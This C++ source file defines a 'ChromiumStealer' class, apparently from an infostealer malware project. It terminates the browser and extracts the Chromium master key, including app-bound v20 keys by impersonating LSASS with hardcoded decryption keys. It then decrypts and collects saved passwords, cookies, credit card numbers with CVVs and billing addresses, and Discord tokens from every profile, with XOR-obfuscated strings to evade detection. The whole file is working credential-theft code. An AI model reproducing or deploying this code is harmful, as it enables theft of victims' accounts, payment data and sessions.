#pragma once

#include "../crypto.hpp"
#include "../config.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "../xor.hpp"
#include "base.hpp"
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <unordered_map>

#if ENABLE_V20_DECRYPT
#include "../impersonate.hpp"
#endif

class ChromiumStealer : public AbstractStealer {
public:
    ChromiumStealer(std::string executable, std::filesystem::path path,
                    int enc_type = 0, std::wstring ncrypt_key_name = L"",
                    bool discord = false)
        : path_(std::move(path))
        , executable_(std::move(executable))
        , discord_(discord)
        , enc_type_(enc_type)
        , ncrypt_key_name_(std::move(ncrypt_key_name))
    {
        kill_process(executable_.c_str());
    }

    void steal() override {
        namespace fs = std::filesystem;
        using json = nlohmann::json;

        fs::path local_state_path = path_ / xor("Local State");
        if (!fs::exists(local_state_path)) return;

        std::string local_state_data;
        if (read_binary_file(local_state_path, local_state_data) != 0)
            return;

        json local_state = json::parse(local_state_data, nullptr, false);
        if (local_state.is_discarded()) return;

        auto os_crypt = local_state.find(xor("os_crypt"));
        if (os_crypt == local_state.end()) return;

        std::vector<uint8_t> master_key;

#if ENABLE_V20_DECRYPT
        if (enc_type_ == 1) {
            master_key = get_v20_master_key(*os_crypt);
            if (master_key.empty())
                master_key = get_v10_master_key(*os_crypt);
        } else if (enc_type_ == 2) {
            master_key = get_v20_2_master_key(*os_crypt);
            if (master_key.empty())
                master_key = get_v10_master_key(*os_crypt);
        } else {
            master_key = get_v10_master_key(*os_crypt);
        }
#else
        master_key = get_v10_master_key(*os_crypt);
#endif

        if (master_key.empty()) return;
        master_key_ = std::move(master_key);

        PRINTF("Got master key (%s)\n", enc_type_ == 0 ? "v10" :
               (enc_type_ == 1 ? "v20" : "v20.2"));

        std::vector<fs::path> profiles;
        fs::path default_profile = path_ / xor("Default");
        if (fs::exists(default_profile / xor("Login Data")))
            profiles.push_back(default_profile);

        try {
            for (const auto& entry : fs::directory_iterator(path_)) {
                if (!fs::is_directory(entry.path())) continue;
                std::string dirname = entry.path().filename().string();
                if (dirname.find(xor("Profile")) == 0 || dirname == xor("Default")) {
                    if (fs::exists(entry.path() / xor("Login Data")))
                        profiles.push_back(entry.path());
                }
            }
        } catch (...) {}

        if (fs::exists(path_ / xor("Login Data")))
            profiles.push_back(path_);

        std::sort(profiles.begin(), profiles.end());
        profiles.erase(std::unique(profiles.begin(), profiles.end()), profiles.end());

        for (const auto& profile_path : profiles) {
            if (discord_) {
                extract_discord_tokens(profile_path);
                continue;
            }

            extract_logins(profile_path);
            extract_cards(profile_path);
            extract_cookies(profile_path);
            extract_discord_tokens(profile_path);
        }
    }

private:
    std::filesystem::path path_;
    std::string executable_;
    std::vector<uint8_t> master_key_;
    bool discord_;
    int enc_type_;
    std::wstring ncrypt_key_name_;

    std::string decrypt_value(const uint8_t* data, size_t size) {
        if (size < 3 || master_key_.empty()) return "";
        return crypto::decrypt_chromium_blob(
            master_key_.data(), master_key_.size(), data, size);
    }

    std::vector<uint8_t> get_v10_master_key(const nlohmann::json& os_crypt) {
        auto it = os_crypt.find(xor("encrypted_key"));
        if (it == os_crypt.end()) return {};
        std::string enc_key_b64 = it->get<std::string>();
        if (enc_key_b64.empty()) return {};
        auto enc_key = crypto::base64_decode(enc_key_b64);
        if (enc_key.size() <= 5) return {};
        std::vector<uint8_t> key_blob(enc_key.begin() + 5, enc_key.end());
        return crypto::dpapi_unprotect(key_blob, CRYPTPROTECT_UI_FORBIDDEN);
    }

#if ENABLE_V20_DECRYPT

    std::vector<uint8_t> derive_v20_from_blob(const crypto::KeyBlob& kb) {
        switch (kb.flag) {
        case 1: {
            auto aes_key = crypto::base64_decode(
                xor("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c="));
            return crypto::aes_gcm_decrypt_vec(aes_key, kb.iv, kb.ciphertext, kb.tag);
        }
        case 2: {
            auto chacha_key = crypto::base64_decode(
                xor("6Y831/Th+kM9GTBNwiWAQgkOLR1+6nZw1B9zjQhylmA="));
            return crypto::chacha20_poly1305_decrypt_vec(chacha_key, kb.iv, kb.ciphertext, kb.tag);
        }
        case 3: {
            if (ncrypt_key_name_.empty()) return {};
            Impersonate imp;
            if (!imp.ImpersonateLsass()) return {};
            auto decrypted_aes = crypto::ncrypt_decrypt(kb.encrypted_aes_key, ncrypt_key_name_);
            if (decrypted_aes.empty()) return {};
            auto xor_key = crypto::base64_decode(
                xor("zPihzsVmBbhRdVK6Gi0GHAOinpAnT7L89Zukt1w5I5A="));
            auto xored = crypto::byte_xor(decrypted_aes, xor_key);
            return crypto::aes_gcm_decrypt_vec(xored, kb.iv, kb.ciphertext, kb.tag);
        }
        default:
            return {};
        }
    }

    std::vector<uint8_t> get_v20_master_key(const nlohmann::json& os_crypt) {
        auto abk_it = os_crypt.find(xor("app_bound_encrypted_key"));
        if (abk_it == os_crypt.end()) return {};
        std::string app_bound_key = abk_it->get<std::string>();
        if (app_bound_key.empty()) return {};

        auto encrypted_key = crypto::base64_decode(app_bound_key);
        if (encrypted_key.size() < 4) return {};
        if (encrypted_key[0] != 'A' || encrypted_key[1] != 'P' ||
            encrypted_key[2] != 'P' || encrypted_key[3] != 'B')
            return {};

        std::vector<uint8_t> master_blob(encrypted_key.begin() + 4, encrypted_key.end());

        Impersonate imp;
        if (!imp.ImpersonateLsass()) return {};

        auto sys_decrypted = crypto::dpapi_unprotect(master_blob, CRYPTPROTECT_LOCAL_MACHINE);
        if (sys_decrypted.empty()) return {};

        imp.Revert();

        auto user_decrypted = crypto::dpapi_unprotect(sys_decrypted, CRYPTPROTECT_UI_FORBIDDEN);
        if (user_decrypted.empty()) return {};

        auto kb = crypto::parse_key_blob(user_decrypted);
        if (kb.flag == 0) return {};

        return derive_v20_from_blob(kb);
    }

    std::vector<uint8_t> get_v20_2_master_key(const nlohmann::json& os_crypt) {
        auto abk_it = os_crypt.find(xor("app_bound_encrypted_key"));
        if (abk_it == os_crypt.end()) return {};
        std::string app_bound_key = abk_it->get<std::string>();
        if (app_bound_key.empty()) return {};

        auto encrypted_key = crypto::base64_decode(app_bound_key);
        if (encrypted_key.size() < 4) return {};
        if (encrypted_key[0] != 'A' || encrypted_key[1] != 'P' ||
            encrypted_key[2] != 'P' || encrypted_key[3] != 'B')
            return {};

        std::vector<uint8_t> master_blob(encrypted_key.begin() + 4, encrypted_key.end());

        Impersonate imp;
        if (!imp.ImpersonateLsass()) return {};

        auto sys_decrypted = crypto::dpapi_unprotect(master_blob, CRYPTPROTECT_LOCAL_MACHINE);
        if (sys_decrypted.empty()) return {};

        imp.Revert();

        auto user_decrypted = crypto::dpapi_unprotect(sys_decrypted, CRYPTPROTECT_UI_FORBIDDEN);
        if (user_decrypted.empty()) return {};

        auto kb2 = crypto::parse_key_blob2(user_decrypted);
        if (kb2.blob2.empty()) return {};

        return kb2.blob2;
    }

#endif

    void extract_logins(const std::filesystem::path& profile_path) {
        namespace fs = std::filesystem;
        fs::path logins_path = profile_path / xor("Login Data");
        if (!fs::exists(logins_path)) return;

        fs::path temp = fs::temp_directory_path() /
            (xor("LoginData_") + std::to_string(GetCurrentProcessId()) + xor(".db"));
        try { fs::copy_file(logins_path, temp, fs::copy_options::overwrite_existing); }
        catch (...) { return; }

        sqlite3* db = nullptr;
        if (sqlite3_open(temp.string().c_str(), &db) != SQLITE_OK) {
            fs::remove(temp);
            return;
        }
        sqlite3_busy_timeout(db, 1000);

        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db,
                xor("SELECT origin_url, username_value, password_value FROM logins"),
                -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                auto url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                auto user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                if (!url_ptr || !user_ptr) continue;

                const void* blob = sqlite3_column_blob(stmt, 2);
                int blob_size = sqlite3_column_bytes(stmt, 2);

                std::string password;
                if (blob && blob_size > 0) {
                    password = decrypt_value((const uint8_t*)blob, blob_size);
                }

                if (password.empty()) continue;

                Login login;
                login.website = url_ptr;
                login.username = user_ptr;
                login.password = std::move(password);
                logins.push_back(std::move(login));
            }
            sqlite3_finalize(stmt);
        }

        sqlite3_close(db);
        fs::remove(temp);
    }

    void extract_cookies(const std::filesystem::path& profile_path) {
        namespace fs = std::filesystem;
        fs::path cookies_path = profile_path / xor("Network") / xor("Cookies");
        if (!fs::exists(cookies_path)) return;

        fs::path temp = fs::temp_directory_path() /
            (xor("Cookies_") + std::to_string(GetCurrentProcessId()) + xor(".db"));
        try { fs::copy_file(cookies_path, temp, fs::copy_options::overwrite_existing); }
        catch (...) { return; }

        sqlite3* db = nullptr;
        if (sqlite3_open(temp.string().c_str(), &db) != SQLITE_OK) {
            fs::remove(temp);
            return;
        }
        sqlite3_busy_timeout(db, 1000);

        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db,
                xor("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies"),
                -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                auto host_ptr = (const char*)sqlite3_column_text(stmt, 0);
                auto name_ptr = (const char*)sqlite3_column_text(stmt, 1);
                if (!host_ptr || !name_ptr) continue;

                const void* blob = sqlite3_column_blob(stmt, 2);
                int blob_size = sqlite3_column_bytes(stmt, 2);
                if (!blob || blob_size == 0) continue;

                std::string value = decrypt_value((const uint8_t*)blob, blob_size);
                if (value.size() > 32) {
                    value = value.substr(32);
                } else if (value.empty()) {
                    continue;
                }

                Cookie cookie;
                cookie.host = host_ptr;
                cookie.name = name_ptr;
                cookie.value = std::move(value);
                cookies.push_back(std::move(cookie));
            }
            sqlite3_finalize(stmt);
        }

        sqlite3_close(db);
        fs::remove(temp);
    }

    void extract_cards(const std::filesystem::path& profile_path) {
        namespace fs = std::filesystem;
        fs::path web_data_path = profile_path / xor("Web Data");
        if (!fs::exists(web_data_path)) return;

        fs::path temp = fs::temp_directory_path() /
            (xor("WebData_") + std::to_string(GetCurrentProcessId()) + xor(".db"));
        try { fs::copy_file(web_data_path, temp, fs::copy_options::overwrite_existing); }
        catch (...) { return; }

        sqlite3* db = nullptr;
        if (sqlite3_open(temp.string().c_str(), &db) != SQLITE_OK) {
            fs::remove(temp);
            return;
        }
        sqlite3_busy_timeout(db, 1000);

        struct CardTemp {
            CreditCard card;
            std::string billing_id;
        };
        std::vector<CardTemp> temp_cards;

        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db,
                xor("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, guid FROM credit_cards"),
                -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                CardTemp ct;

                auto name_ptr = (const char*)sqlite3_column_text(stmt, 0);
                ct.card.name = name_ptr ? name_ptr : "";

                auto month_ptr = (const char*)sqlite3_column_text(stmt, 1);
                auto year_ptr = (const char*)sqlite3_column_text(stmt, 2);
                std::string month = month_ptr ? month_ptr : "";
                std::string year = year_ptr ? year_ptr : "";
                if (!month.empty() && !year.empty())
                    ct.card.expiration = month + "/" + year;

                const void* blob = sqlite3_column_blob(stmt, 3);
                int blob_size = sqlite3_column_bytes(stmt, 3);
                if (blob && blob_size > 0) {
                    ct.card.number = decrypt_value((const uint8_t*)blob, blob_size);
                }

                auto billing_ptr = (const char*)sqlite3_column_text(stmt, 4);
                ct.billing_id = billing_ptr ? billing_ptr : "";

                auto guid_ptr = (const char*)sqlite3_column_text(stmt, 5);
                ct.card.guid = guid_ptr ? guid_ptr : "";

                temp_cards.push_back(std::move(ct));
            }
            sqlite3_finalize(stmt);
        }

        std::unordered_map<std::string, std::string> cvv_map;
        {
            sqlite3_stmt* cvv_stmt = nullptr;
            if (sqlite3_prepare_v2(db,
                    xor("SELECT guid, value_encrypted FROM local_stored_cvc WHERE value_encrypted IS NOT NULL"),
                    -1, &cvv_stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(cvv_stmt) == SQLITE_ROW) {
                    auto guid_ptr = (const char*)sqlite3_column_text(cvv_stmt, 0);
                    if (!guid_ptr) continue;
                    const void* blob = sqlite3_column_blob(cvv_stmt, 1);
                    int blob_size = sqlite3_column_bytes(cvv_stmt, 1);
                    if (blob && blob_size > 0) {
                        std::string cvv = decrypt_value((const uint8_t*)blob, blob_size);
                        if (!cvv.empty())
                            cvv_map[std::string(guid_ptr)] = cvv;
                    }
                }
                sqlite3_finalize(cvv_stmt);
            }
        }

        for (auto& ct : temp_cards) {
            auto cvv_it = cvv_map.find(ct.card.guid);
            if (cvv_it != cvv_map.end())
                ct.card.cvv = cvv_it->second;

            if (!ct.billing_id.empty()) {
                sqlite3_stmt* addr_stmt = nullptr;
                if (sqlite3_prepare_v2(db,
                        va(xor("SELECT type, value FROM local_addresses_type_tokens WHERE guid = '%s'"),
                           ct.billing_id.c_str()).c_str(),
                        -1, &addr_stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(addr_stmt) == SQLITE_ROW) {
                        auto val = (const char*)sqlite3_column_text(addr_stmt, 1);
                        std::string value = val ? val : "";
                        switch (sqlite3_column_int(addr_stmt, 0)) {
                        case 33: ct.card.city    = value; break;
                        case 34: ct.card.state   = value; break;
                        case 35: ct.card.zip     = value; break;
                        case 36: ct.card.country = value; break;
                        case 77: ct.card.street  = value; break;
                        }
                    }
                    sqlite3_finalize(addr_stmt);
                }
            }

            cards.push_back(std::move(ct.card));
        }

        sqlite3_close(db);
        fs::remove(temp);
    }

    void extract_discord_tokens(const std::filesystem::path& profile_path) {
        namespace fs = std::filesystem;
        auto level_db_path = profile_path / xor("Local Storage") / xor("leveldb");
        if (!fs::exists(level_db_path)) return;

        for (const auto& entry : fs::directory_iterator(level_db_path)) {
            auto ext = entry.path().extension().string();
            if (ext != xor(".ldb") && ext != xor(".log")) continue;

            std::string content;
            if (read_binary_file(entry.path(), content) != 0) continue;

            if (discord_) {
                for (size_t pos = 0;
                     (pos = content.find(xor("dQw4w9WgXcQ:"), pos)) != std::string::npos;
                     pos++) {
                    size_t end_pos = content.find('"', pos);
                    if (end_pos == std::string::npos) continue;
                    std::string token_b64 = content.substr(pos + 12, end_pos - pos - 12);
                    std::string decoded = crypto::base64_decode_str(token_b64);
                    if (decoded.size() >= 3 + 12 + 16) {
                        std::string decrypted = decrypt_value(
                            (const uint8_t*)decoded.c_str(), decoded.size());
                        if (!decrypted.empty())
                            append_discord_token(decrypted);
                    }
                }
            }

            for (size_t i = 0; i + 32 < content.size(); ++i) {
                if (content[i + 24] != '.' || content[i + 31] != '.') continue;
                if (!std::all_of(content.begin() + i, content.begin() + i + 31,
                    [](char c) { return (c >= '0' && c <= 'z') || c == '.'; }))
                    continue;
                size_t end = i + 32;
                while (end < content.size() && content[end] >= '0' && content[end] <= 'z') ++end;
                append_discord_token(content.substr(i, end - i));
            }
        }
    }
};
